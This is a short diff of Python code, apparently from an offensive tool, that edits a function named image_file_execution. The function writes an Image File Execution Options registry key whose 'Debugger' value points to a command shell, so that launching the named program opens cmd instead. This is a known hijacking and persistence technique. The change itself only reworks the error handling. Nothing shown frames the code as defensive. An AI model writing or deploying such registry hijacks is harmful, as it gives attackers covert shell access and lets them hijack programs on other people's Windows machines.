@@ -19,10 +19,6 @@ def image_file_execution(executable):
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",executable))
 		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,cmd_path())
-	except Exception as e:
-		return False
-	except WindowsError as e:
-		return False
-	finally:
 		_winreg.CloseKey(key)
-		return True
+	except Exception as error:
+		return False
